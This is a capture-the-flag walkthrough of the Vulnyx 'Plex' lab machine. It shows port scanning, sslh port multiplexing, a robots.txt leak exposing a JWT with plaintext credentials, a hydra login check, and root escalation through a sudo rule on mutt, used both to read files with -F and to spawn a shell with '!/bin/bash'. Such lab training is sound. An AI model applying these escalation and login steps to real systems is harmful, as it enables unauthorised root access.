# Vulnyx: Plex

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `curl` · `ffuf` · `hydra` |
| **Tags** | `#JWT` `#InfoDisclosure` `#PortMultiplexing` `#sslh` `#SudoAbuse` `#mutt` `#GTFOBins` |
| **URL** | https://vulnyx.com/machines/ |

A single port (21) fronts both SSH and a web server through a protocol multiplexer — the box's own hint, "you only need a port to be happy." `robots.txt` on that web server leaks a randomly-named endpoint returning a JWT, and the token embeds a plaintext username and password directly as claims, no cracking needed. From there, a `sudo` rule around `mutt` (an email client) is used two ways: first as a quick file-read trick to grab the root flag, then through its own shell-escape to get an actual root shell.

## Enumeration

### Port Enumeration

A full TCP port scan comes first — and finds a single open port, 21, which nmap labels `ftp` by convention:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn plex.nyx

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
MAC Address: 08:00:27:51:AC:00 (Oracle VirtualBox virtual NIC)
```

The version scan against 21 tells a different story — the banner is **OpenSSH**, not FTP:

```bash
$ sudo nmap -p 21 -sCV plex.nyx

PORT   STATE SERVICE VERSION
21/tcp open  ftp     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
|_ftp-bounce: ERROR: Script execution failed (use -d to debug)
|_ssh-hostkey:
|  2048 56:9b:dd:56:a5:c1:e3:52:a8:42:46:18:5e:0c:12:86 (RSA)
|   256 1b:d2:cc:59:21:50:1b:39:19:77:1d:28:c0:be:c6:82 (ECDSA)
|_  256 9c:e7:41:1b:6d:03:ed:f5:a1:4c:cc:0a:50:79:1c:20 (ED25519)
MAC Address: 08:00:27:51:AC:00 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So port 21 speaks SSH, yet — as the next step shows — it *also* answers HTTP. That isn't a contradiction: a protocol multiplexer like `sslh` listens on one port and inspects the first bytes of each connection, forwarding SSH handshakes to `sshd` and HTTP requests to Apache. One port, two services, exactly as the box's banner hints.

### Probing Port 21

An SSH connection to 21 gets a password prompt — SSH is genuinely listening there:

```bash
$ ssh root@plex.nyx -p 21
root@plex.nyx's password:
```

And an HTTP request to the same port is served by Apache — the multiplexer routing it to the web server instead:

```bash
$ curl -i 'http://plex.nyx:21'
HTTP/1.1 200 OK
Date: Sat, 29 Aug 2026 11:45:18 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Wed, 28 Feb 2024 17:50:38 GMT
ETag: "31-61274c7cf85!9"
Accept-Ranges: bytes
Content-Length: 49
Content-Type: text/html

$ curl -sX GET http://plex.nyx:21
Hello Bro!
You only need a port to be happy...
```

### Web Enumeration

Fuzzing the web server on 21 turns up `robots.txt`:

```bash
$ ffuf -u http://plex.nyx:21/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.html                 [Status: 200, Size: 49, Words: 9, Lines: 5, Duration: 448ms]
robots.txt                 [Status: 200, Size: 58, Words: 3, Lines: 3, Duration: 3ms]
server-status              [Status: 200, Size: 23374, Words: 513, Lines: 371, Duration: 8ms]
```

`robots.txt` discloses a randomly-named path — the sort of "hidden" endpoint `robots.txt` exists to keep crawlers out of, which makes it a pointer for anyone reading it directly:

```bash
$ curl -sX GET http://plex.nyx:21/robots.txt
User-agent: *
Disallow: /9a618248b64db62d15b300a07b00580b
```

Requesting that path returns a JWT (a `header.payload.signature` token, three base64url parts joined by dots):

```bash
$ curl -sX GET http://plex.nyx:21/9a618248b64db62d15b300a07b00580b/
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiIiLCJpYXQiOm51bGwsImV4cCI6bnVsbCwiYXVkIjoiIiwic3ViIjoiIiwiaWQiOiIxIiwidXNlcm5hbWUiOiJtYXVybyIsInBhc3N3b3JkIjoibUB1UjAxMjMhIn0.0HeVnqaCJ0Izumtwahqneqr...
```

## Initial Access

### Credentials Embedded in a JWT

A JWT's payload is only base64-encoded, not encrypted — its signature protects it from *tampering*, but anyone holding the token can read the claims. Decoding the payload here reveals the whole point of the box: a username and password sitting in plaintext as claims:

```json
{
  "iss": "",
  "iat": null,
  "exp": null,
  "aud": "",
  "sub": "",
  "id": "1",
  "username": "mauro",
  "password": "m@uR0123!"
}
```

<img src="../Images/plex/Pasted image 20260829140133.png"/>

> **Credentials:** `mauro:m@uR0123!`

### Shell as mauro

The credentials are confirmed against SSH on port 21 (`-s 21` since it isn't the default 22), then used to log in — the same multiplexed port that served the web content also carries the SSH session:

```bash
$ hydra -l 'mauro' -p 'm@uR0123!' ssh://plex.nyx -s 21

[DATA] attacking ssh://plex.nyx:21/
[21][ssh] host: plex.nyx   login: mauro   password: m@uR0123!
1 of 1 target successfully completed, 1 valid password found
```

```bash
$ ssh mauro@plex.nyx -p 21
mauro@plex:~$ id
uid=1000(mauro) gid=1000(mauro) groups=1000(mauro)
mauro@plex:~$ cat /home/mauro/user.txt
05135a0133cbb692dc66761e5d99364a
```

> **User flag:** `05135a0133cbb692dc66761e5d99364a`

## Privilege Escalation

### Take One: Reading the Flag via `mutt -F`

```bash
mauro@plex:~$ sudo -l
Matching Defaults entries for mauro on plex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin

User mauro may run the following commands on plex:
    (root) NOPASSWD: /usr/bin/mutt
```

> **GTFOBins:** `https://gtfobins.github.io/gtfobins/mutt/`

`mauro` can run `mutt` as root. Its `-F` flag names a configuration file (a `muttrc`), which `mutt` reads line by line as configuration commands. Point it at a file that *isn't* valid config — like `/root/root.txt` — and every line fails to parse, and `mutt` echoes the offending content back in its error. Run as root via `sudo`, that turns `mutt` into an arbitrary file-reader for root-only files:

```bash
mauro@plex:~$ sudo /usr/bin/mutt -F /root/root.txt
Error en /root/root.txt, renglón 1: 943f08fb32181d5f8171332146f39e41: comando descodificado
source: errores en /root/root.txt
Presione una tecla para continuar...
```

The flag is right there in the "comando descodificado" (unknown command) error:

> **Root flag:** `943f08fb32181d5f8171332146f39e41`

### Take Two: A Real Root Shell via `mutt`

Reading the flag this way doesn't leave a shell behind. `mutt` is launched normally instead, and its `!` command — which runs an external shell command from the index — is used to spawn a shell. Since `mutt` is running as root, so is the shell:

```bash
mauro@plex:~$ sudo -u root /usr/bin/mutt
```

At the `mutt` index, `?` lists the key bindings and `!` prompts for a shell command — entering `/bin/bash` there drops into a root shell:

```
?
!/bin/bash
```

<img src="../Images/plex/Pasted image 20260829135103.png"/>
<img src="../Images/plex/Pasted image 20260829135205.png"/>
<img src="../Images/plex/Pasted image 20260829135235.png"/>

```bash
root@plex:/home/mauro# id
uid=0(root) gid=0(root) groups=0(root)
root@plex:/home/mauro# cat /root/root.txt
943f08fb32181d5f8171332146f39e41
```

> **Root flag:** `943f08fb32181d5f8171332146f39e41`

Same value as the one recovered directly through `-F` — both approaches reach the same flag, so it's confirmed.

## Takeaways

- A JWT is only as secure as what's actually inside it — the signature prevents tampering, not disclosure. The payload is merely base64-encoded, so embedding a plaintext password as a claim defeats the entire point of using a token.
- One open port doesn't mean one service — a protocol multiplexer (`sslh` and similar) can front SSH and HTTP on the same port, so a banner that looks like one thing is worth probing with the other protocol too.
- `robots.txt` continues to be worth checking on every target, including ones on non-standard ports — it's written for crawlers, not for hiding paths from a person looking directly.
- Grabbing a flag through a file-read primitive and getting an actual interactive shell are two different outcomes worth distinguishing — the first proves the vulnerability, the second demonstrates real access.